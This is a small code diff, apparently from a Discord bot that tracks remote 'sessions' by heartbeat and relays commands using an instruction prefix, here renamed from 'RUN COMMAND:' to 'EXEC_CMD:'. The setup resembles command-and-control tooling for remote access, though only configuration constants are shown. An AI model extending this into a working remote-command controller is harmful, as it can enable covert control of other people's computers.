@@ -6,7 +6,7 @@ import asyncio
 
 # --- Configuration & State ---
 TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]
-COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'RUN COMMAND:'; PONG_PREFIX = 'PONG:'
+COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'EXEC_CMD:'; PONG_PREFIX = 'PONG:'
 LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; DOWN_SESSIONS_CATEGORY = "⚫️ Down Sessions"
 HEARTBEAT_INTERVAL_SECONDS = 60; HEARTBEAT_TIMEOUT_SECONDS = 150
 active_sessions = {}; last_heartbeat = {}
